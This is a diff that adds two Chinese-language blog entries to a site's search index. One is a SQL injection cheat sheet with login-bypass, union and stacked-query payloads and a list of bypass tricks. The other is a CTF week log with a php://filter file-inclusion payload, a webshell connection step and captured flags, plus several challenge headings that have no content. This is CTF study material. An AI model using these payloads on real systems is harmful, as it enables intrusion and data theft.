@@ -303,4 +303,50 @@
         <tag>CTF - Web</tag>
       </tags>
   </entry>
+  <entry>
+    <title>SQL-Inject-20200729</title>
+    <url>/2020/07/29/SQL-Inject-20200729/</url>
+    <content><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h2 id="常规操作流程："><a href="#常规操作流程：" class="headerlink" title="常规操作流程："></a>常规操作流程：</h2><p>1.测试有多少字段<br>2.爆出数据库名<br>3.爆出数据库里的表<br>4.爆出表的列名<br>5.爆出所有数据</p>
+<h2 id="常见注入方法："><a href="#常见注入方法：" class="headerlink" title="常见注入方法："></a>常见注入方法：</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or &#39;1&#39;&#x3D;&#39;1	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line">&#39; or 1&#x3D;1#	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;</span><br><span class="line">&#39;&#x3D;0#		&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#</span><br></pre></td></tr></table></figure>
+
+<h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xx&#39; union select 1,(select database()) #</span><br><span class="line">xx&#39; union select (select database()),2 or &#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br><span class="line">1&#39;;show tables from supersqli;#</span><br><span class="line">1&#39;;show columns from __;</span><br></pre></td></tr></table></figure>
+<h2 id="常见注入技巧："><a href="#常见注入技巧：" class="headerlink" title="常见注入技巧："></a>常见注入技巧：</h2><p>bypass</p>
+<p>mid切割字符串</p>
+<p>hex编码与字符串</p>
+<p>利用group_concat连接多行</p>
+<p>利用like和regexp来进行匹配</p>
+<p>mysql的GBK导致的宽字节注入</p>
+<p>mysql关于utf-8编码问题</p>
+]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>CTF - web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week20200727-20200802</title>
+    <url>/2020/07/28/week20200727-20200802/</url>
+    <content><![CDATA[<h1 id="Week-2-lt-2020-07-27-2020-08-02-gt"><a href="#Week-2-lt-2020-07-27-2020-08-02-gt" class="headerlink" title="Week 2 &lt;2020.07.27 - 2020.08.02&gt;"></a>Week 2 &lt;2020.07.27 - 2020.08.02&gt;</h1><a id="more"></a>
+
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目和网页都给出了提示，考察文件包含</p>
+<p>同 Secret File 的解法，使用”php://filter”伪协议进行包含</p>
+<p>payload：/?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>获得base64码，解密得到flag</p>
+<p>flag{f876c961-c87b-4060-a5b5-299aae870ace}</p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>用AntSword连接，密码网页给出了是”Syc”</p>
+<p><img src="/2020/07/28/week20200727-20200802/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200729003126637.png" alt="image-20200729003126637"></p>
+<p>连接，在根目录找到flag文件</p>
+<p>flag{41d79b55-d82a-4490-9bb4-31f8308a676a}</p>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2>]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
 </search>
